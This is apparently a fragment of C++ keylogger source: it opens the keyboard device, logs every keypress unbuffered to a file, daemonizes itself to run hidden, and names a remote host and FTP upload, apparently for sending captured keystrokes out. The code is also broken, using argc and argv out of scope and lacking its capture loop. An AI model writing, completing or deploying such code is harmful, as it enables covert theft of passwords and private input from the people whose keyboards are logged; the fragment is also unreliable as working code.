#include <memory>
#include "keylogger.hpp"

/*
** Parse flags to structure for some applications settings
** Needed for now FTP URL
**
** Check https://www.boost.org/doc/libs/1_67_0/doc/html/program_options.html
**
*/

void parse_flags(char **av)
{
	return;
}

void run()
{
	std::unique_ptr<Keylogger> prog(new Keylogger("log.txt", "extragornax.fr"));

	rootCheck();

	Config config;
	parseOptions(argc, argv, &config);

   	int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
   	assert(kbd_fd > 0);

	FILE *logfile = fopen(config.logFile, "a");
	if (logfile == NULL) {
		LOG_ERROR("Could not open log file");
	exit(-1);
	}

	// We want to write to the file on every keypress, so disable buffering
	setbuf(logfile, NULL);

	// Daemonize process. Don't change working directory but redirect standard
	// inputs and outputs to /dev/null
	if (daemon(1, 0) == -1) {
		LOG_ERROR("%s", strerror(errno));
	exit(-1);
	}

	uint8_t shift_pressed = 0;
	input_event event;

	return;
}

int main(int ac, char **av)
{
	if (ac != 1) {
		parse_flags(av);
	}
	run();
	return 0;
}